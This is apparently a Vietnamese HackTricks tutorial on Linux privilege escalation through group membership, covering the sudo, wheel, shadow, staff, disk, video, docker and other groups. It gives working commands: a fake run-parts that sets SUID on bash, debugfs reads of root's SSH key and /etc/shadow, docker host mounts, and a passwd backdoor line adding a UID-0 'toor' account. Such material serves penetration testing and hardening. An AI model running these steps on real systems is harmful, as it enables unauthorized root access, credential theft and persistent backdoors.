# Các nhóm đáng chú ý - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Nhóm Sudo/Admin

### **PE - Method 1**

**Đôi khi**, chính sách **/etc/sudoers** của hệ thống (hoặc một tệp được include từ đó) chứa các mục như sau:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Điều này có nghĩa là bất kỳ người dùng nào khớp với một trong hai mục nhập đều có thể chạy bất kỳ lệnh nào với tư cách là người dùng đích bất kỳ thông qua `sudo` (tùy thuộc vào các quy định còn lại).<sup>[[3]](#references)</sup>

Nếu đúng như vậy, để **trở thành root, bạn chỉ cần thực thi**:

```
sudo su
```

Nếu `sudo -l` cho phép chạy `adduser` với giới hạn chỉ nhận tên người dùng, hãy kiểm tra xem lệnh này có tạo nhóm chính trùng tên chưa tồn tại hay không. Tài khoản mới trong nhóm đó có thể có thêm quyền nếu chính sách sudoers hiện hành đã cấp quyền cho `%group`; hãy xác minh cả hành vi tạo nhóm lẫn quy tắc nhóm trước khi xem đây là một hướng leo thang đặc quyền. Việc tạo tài khoản sẽ làm thay đổi hệ thống, vì vậy hãy kiểm tra chính sách trước.

### PE - Method 2

Tìm tất cả các binary suid và kiểm tra xem có binary **Pkexec** hay không:

```bash
find / -perm -4000 2>/dev/null
```

Nếu **pkexec là một binary SUID**, nó chỉ có thể thực thi chương trình với tư cách người dùng khác khi polkit cấp quyền cho hành động được yêu cầu; chỉ riêng bit SUID không đảm bảo có quyền root. Hãy kiểm tra chính sách đã cài đặt và quyền của phiên mục tiêu, thay vì cho rằng chỉ cần thuộc nhóm **sudo** hoặc **admin** là đủ.<sup>[[4]](#references)[[5]](#references)</sup>

Với hướng khai thác riêng [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), trước tiên hãy xác minh rằng `pkexec` là tệp thực thi **SUID do root sở hữu**. Binary đã cài đặt nhưng không có bit đó không phải là trường hợp leo thang đặc quyền SUID cục bộ được mô tả trong advisory. Chuỗi phiên bản upstream chỉ là manh mối: các bản phân phối có thể [backport bản vá vào các phiên bản gói cũ hơn](https://ubuntu.com/security/CVE-2021-4034), vì vậy hãy kiểm tra gói của nhà cung cấp đã cài đặt và các biện pháp giảm thiểu trước khi kết luận rằng nó dễ bị tấn công.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) là một hướng polkit khác: race condition trong cấp quyền D-Bus, không phải lỗi SUID của `pkexec`. Hãy xem xét gói polkit của nhà cung cấp đã cài đặt và liệu có hành động D-Bus đặc quyền nào có thể truy cập được để thực hiện thay đổi hữu ích hay không; hướng tạo tài khoản cũng cần một dịch vụ phù hợp như AccountsService, và quyền sudo của nhóm mới phụ thuộc vào chính sách sudo có hiệu lực. Chỉ riêng phiên bản polkit được báo cáo hoặc dịch vụ đã cài đặt chưa đủ để xác định khả năng bị tấn công, đặc biệt khi nhà cung cấp có thể [backport bản vá](https://access.redhat.com/security/cve/cve-2021-3560). Việc liệt kê thụ động không nên kích hoạt race condition.

Trên các bản phân phối vẫn dùng backend Local Authority cũ hơn, hãy kiểm tra các quy tắc nhóm bằng lệnh:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Tên các group liên quan và giá trị mặc định khác nhau tùy theo bản phân phối; group chỉ hữu ích ở đây nếu chính sách cục bộ chỉ định tên group đó.<sup>[[5]](#references)</sup>

Để **trở thành root, bạn có thể thực thi**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Nếu bạn thử thực thi **pkexec** và nhận được **lỗi** này:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Trong một phiên SSH không có authentication agent đã đăng ký, `pkexec` có thể báo lỗi này ngay cả khi policy cho phép hành động đó; polkit ghi nhận `pkttyagent` là authentication agent dạng văn bản dành cho các phiên không phải desktop. Hành vi cụ thể phụ thuộc vào phiên bản và bản phân phối, vì vậy hãy kiểm tra policy và cấu hình agent trên hệ thống. Một cách khắc phục được báo cáo cho một số phiên bản NixOS bị ảnh hưởng là dùng **2 phiên SSH khác nhau**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

ACL từ chối một tài khoản truy cập `su` chỉ áp dụng cho executable đó, chứ không phải mọi con đường để thực hiện một hành động được administrator cho phép. Nếu thông tin xác thực của administrator bị lộ theo một cách độc lập, hãy xem xét liệu policy polkit có hiệu lực có cho phép một hành động riêng biệt như khởi chạy system service tạm thời thông qua `systemd-run` hay không, authentication agent chấp nhận danh tính nào và service được tạo sẽ chạy dưới danh tính nào. [Polkit phân biệt việc xác thực với tư cách chủ sở hữu phiên và với tư cách administrator](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), trong khi [systemd-run có thể yêu cầu system manager tạo một transient service](https://systemd.io/CONTROL_GROUP_INTERFACE/). Chỉ riêng một mục trong history, command đã cài đặt hoặc policy file có thể đọc được không chứng minh rằng hành động được cấp quyền hay thông tin xác thực hợp lệ; việc rà soát thụ động không nên gửi thông tin xác thực hoặc khởi chạy unit.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Nhóm Wheel

Đôi khi, chính sách sudoers cũng có thể chứa mục này:

```
%wheel	ALL=(ALL:ALL) ALL
```

Điều này có nghĩa là bất kỳ người dùng nào khớp với mục nhập đều có thể chạy bất kỳ lệnh nào với tư cách bất kỳ người dùng đích nào thông qua `sudo` (tùy thuộc vào các phần còn lại của chính sách).<sup>[[3]](#references)</sup>

Nếu đúng như vậy, để **trở thành root, bạn chỉ cần thực thi**:

```
sudo su
```

## Nhóm Shadow

Trên các hệ thống có quyền cho phép, người dùng thuộc nhóm **shadow** có thể **đọc** **/etc/shadow**; hãy xác minh mode và ACL thực tế trên mục tiêu:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Vì vậy, hãy đọc tệp và thử **crack một số hash**.

Lưu ý nhanh về trạng thái khóa khi phân loại hash:
- Các mục có `!` hoặc `*` thường không thể dùng để đăng nhập bằng mật khẩu theo cách tương tác.
- `!hash` nghĩa là mật khẩu đã bị khóa; các ký tự còn lại biểu thị trường mật khẩu trước khi bị khóa.
- Trường chứa `*` không phải là hash `crypt(3)` hợp lệ và ngăn đăng nhập UNIX bằng mật khẩu; không thể suy ra từ đó liệu mật khẩu đã từng được thiết lập hay chưa.
Thông tin này hữu ích để phân loại tài khoản ngay cả khi không thể đăng nhập trực tiếp.<sup>[[6]](#references)</sup>

## Nhóm Staff

**staff**: Cho phép người dùng thêm các sửa đổi cục bộ vào hệ thống (`/usr/local`) mà không cần quyền root (lưu ý rằng các tệp thực thi trong `/usr/local/bin` nằm trong biến PATH của mọi người dùng và có thể “ghi đè” các tệp thực thi cùng tên trong `/bin` và `/usr/bin`). So sánh với nhóm "adm", nhóm này liên quan nhiều hơn đến việc giám sát/bảo mật.<sup>[[2]](#references)[[7]](#references)</sup>

Trong các cấu hình Debian mà `/usr/local/bin` đứng trước `/usr/bin` trong `PATH` (như trong các ví dụ bên dưới), một lệnh không chỉ định đường dẫn sẽ chạy bản sao trong `/usr/local/bin` trước; hãy xác nhận `PATH` thực tế trên mục tiêu.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Nếu một tiến trình có đặc quyền phân giải lệnh không kèm đường dẫn thông qua `/usr/local/bin` có quyền ghi, việc thay thế lệnh đó có thể khiến mã chạy với các đặc quyền của tiến trình; hãy xác nhận đường dẫn thực tế và điều kiện kích hoạt trước khi kiểm thử.

Trên hệ thống Ubuntu, `pam_motd` chạy các script thực thi thông qua `run-parts --lsbsysinit` với quyền root khi đăng nhập; các tác vụ cron cũng có thể dùng `run-parts`, nhưng điều này phụ thuộc vào bản phân phối và cấu hình.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Khi có một lần đăng nhập SSH mới, `pspy` có thể giúp xác nhận liệu đường dẫn này có thực sự được gọi trên mục tiêu hay không; công cụ này có thể quan sát dòng lệnh của các tiến trình mà không cần quyền root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Nhóm disk

Thành viên của nhóm **disk** có thể được cấp quyền truy cập thô vào các thiết bị khối và thường **gần tương đương quyền truy cập root**; Debian mô tả quyền này phần lớn tương đương root, nhưng hãy xác minh quyền của thiết bị thực tế và bố cục lưu trữ trên mục tiêu.<sup>[[7]](#references)</sup>

Các đường dẫn thiết bị phổ biến gồm `/dev/sd*`, nhưng NVMe và các bố cục lưu trữ khác sử dụng tên khác.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` hoạt động trên các hệ thống tệp ext2/ext3/ext4; các đường dẫn như `/root` và `/etc/shadow` ở trên là các tệp bên trong hệ thống tệp đã mở, còn đối số thứ hai của `dump` là đường dẫn đầu ra trên hệ thống tệp gốc.<sup>[[8]](#references)</sup> Ví dụ, lệnh này trích xuất `/tmp/asd1.txt` từ hệ thống tệp đã mở sang `/tmp/asd2.txt` trên hệ thống tệp gốc:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Tùy chọn `-w` mở hệ thống tệp ở chế độ đọc-ghi, còn lệnh `write` sao chép một tệp gốc vào hệ thống tệp đã mở. Tránh dùng tùy chọn này trên hệ thống tệp đang được gắn kết và hoạt động, vì chỉnh sửa trực tiếp có thể làm hỏng hệ thống tệp; nếu có thể, hãy thao tác trên ảnh ngoại tuyến.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Nhóm Video

Dùng lệnh `w`, bạn có thể tìm hiểu **ai đang đăng nhập vào hệ thống**. Lệnh này sẽ hiển thị kết quả như sau.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Mục **tty1** xác định virtual console Linux đầu tiên; bản thân mục này không chứng minh rằng có người dùng đang hiện diện trực tiếp tại máy, đặc biệt là trong container hoặc các môi trường khác.<sup>[[21]](#references)</sup>

Trên các hệ thống cho phép đọc framebuffer device, thành viên của nhóm **video** có thể được cấp quyền truy cập vào thiết bị đó. Tài liệu về giao diện Linux framebuffer mô tả `/dev/fb0` là thiết bị bộ nhớ có thể đọc, nội dung của thiết bị này có thể được sao chép để chụp ảnh màn hình; đường dẫn `/sys/class/graphics/fb0/virtual_size` chỉ khả dụng khi có thuộc tính fbdev sysfs này, vì vậy hãy kiểm tra hệ thống mục tiêu trước.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Nếu phiên bản **GIMP** đã cài có trình nhập dữ liệu thô, hãy mở **`screen.raw`** bằng trình nhập đó; khả năng hỗ trợ và các điều khiển có thể khác nhau tùy phiên bản và plug-in.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Để mở ảnh raw, bạn có thể dùng GIMP, chọn tệp screen.raw và chọn Raw image data làm loại tệp](<../../../images/image (463).png>)

Đặt Width và Height của ảnh khớp với hình học framebuffer; thử các định dạng pixel/Image Types hiện có cho đến khi đầu ra dễ đọc.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Sau đó thay đổi Width và Height theo kích thước màn hình, rồi thử các Image Types khác nhau (và chọn loại hiển thị màn hình rõ nhất)](<../../../images/image (317).png>)

## Root Group

Việc thuộc nhóm **root** không cấp UID của root, nhưng các tệp cho phép nhóm ghi và thuộc sở hữu của `root` vẫn có thể đáng chú ý nếu dịch vụ hoặc thư viện có đặc quyền sử dụng chúng. Hãy xác minh quyền thực tế của tệp và cách tệp được sử dụng trước khi xem đây là một hướng leo thang đặc quyền.

**Kiểm tra những tệp mà thành viên nhóm root có thể chỉnh sửa**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Nhóm Docker

Thành viên của nhóm `docker` được cấp quyền truy cập cấp root vào Docker daemon trên các bản cài đặt rootful tiêu chuẩn. Vì bind mount mặc định có quyền đọc-ghi, người có thể kiểm soát daemon đó có thể mount `/` của host vào container và sửa đổi các tệp trên host; điều này trên thực tế cấp quyền root trên host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Thông tin thành viên nhóm có thể không đồng bộ giữa `/etc/group`, `/etc/gshadow` và token của tiến trình hiện tại. Nếu người dùng không xuất hiện trong `id -nG` nhưng `newgrp docker` chạy thành công, hãy kiểm tra nhóm được hiển thị bởi `id` trong shell mới, đồng thời xác minh liệu socket Docker có thực sự ghi được và có phục vụ một daemon rootful hay không. Chỉ riêng tên nhóm không chứng minh được quyền kiểm soát host. Giới hạn thời gian cho mọi phép thử `newgrp` tự động để lời nhắc mật khẩu không làm việc liệt kê bị đình trệ.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Cuối cùng, nếu bạn không thích bất kỳ gợi ý nào ở trên hoặc chúng không hiệu quả vì lý do nào đó (ví dụ: firewall của docker API), bạn luôn có thể thử **chạy một container privileged rồi escape khỏi container đó** như giải thích tại đây:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Nếu bạn có quyền ghi vào docker socket, hãy đọc [**bài viết này về cách leo thang đặc quyền bằng cách lạm dụng docker socket**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Nhóm lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Nhóm Adm

Thông thường, **các thành viên** của nhóm **`adm`** có quyền **đọc các tệp log** trong _/var/log/_.\
Vì vậy, nếu bạn đã xâm nhập được một người dùng thuộc nhóm này, hãy chắc chắn **kiểm tra các log**.<sup>[[7]](#references)</sup>

## Nhóm Backup / Operator / lp / Mail

Các nhóm này có ý nghĩa riêng tùy theo dịch vụ và bản phân phối. Debian ghi nhận `backup` dùng cho việc ủy quyền sao lưu/khôi phục, `lp` dành cho các daemon máy in và `mail` dành cho `/var/mail`, vì vậy hãy kiểm tra quyền cục bộ trước khi xem việc thuộc các nhóm này là một con đường leo thang đặc quyền.<sup>[[7]](#references)</sup>

Chúng thường là các vector **tìm kiếm thông tin xác thực** hơn là vector trực tiếp dẫn đến root:
- **backup**: có thể làm lộ các bản lưu trữ chứa cấu hình, khóa, bản dump DB hoặc token.
- **operator**: quyền truy cập vận hành tùy nền tảng, có thể làm lộ dữ liệu nhạy cảm trong thời gian chạy.
- **lp**: hàng đợi/bộ đệm in có thể chứa nội dung tài liệu.
- **mail**: các vùng lưu trữ thư có thể làm lộ liên kết đặt lại mật khẩu, OTP và thông tin xác thực nội bộ.

Hãy xem việc thuộc các nhóm này là một phát hiện có giá trị cao về rò rỉ dữ liệu và pivot bằng cách tái sử dụng mật khẩu/token.

## Nhóm Auth

Trên OpenBSD, khi S/Key được cấu hình, `/etc/skey` thuộc sở hữu của `root:auth` và cần có nhóm `auth` để truy cập các bản ghi; bản ghi YubiKey được lưu trong `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Một cấu hình OpenBSD 6.6 dễ bị tổn thương khi bật S/Key hoặc YubiKey cho phép người dùng cục bộ có quyền `auth` trở thành root; Qualys mô tả điều kiện tiên quyết và chuỗi khai thác, còn PoC được liên kết triển khai cách khai thác đó.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Xác thực pkexec/pkttyagent không cần phiên GUI (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Trang hướng dẫn Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Sổ tay tham khảo polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Sổ tay tham khảo polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Sổ tay bảo mật Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Trang hướng dẫn Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Thiết bị Frame Buffer — Tài liệu Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Trang hướng dẫn Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Trang hướng dẫn Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — theo dõi tiến trình Linux không cần đặc quyền](https://github.com/DominicBreuker/pspy)
- [13] [Bảo mật Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Quản lý Docker bằng người dùng không phải root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Chạy container — Tài liệu Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — Trang hướng dẫn OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — Trang hướng dẫn OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Các lỗ hổng xác thực trong OpenBSD — Thông báo bảo mật Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC khai thác cục bộ](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Các thiết bị được cấp phát trong Linux (phiên bản 4.x trở lên)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Nhập và xuất hình ảnh — Tài liệu GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
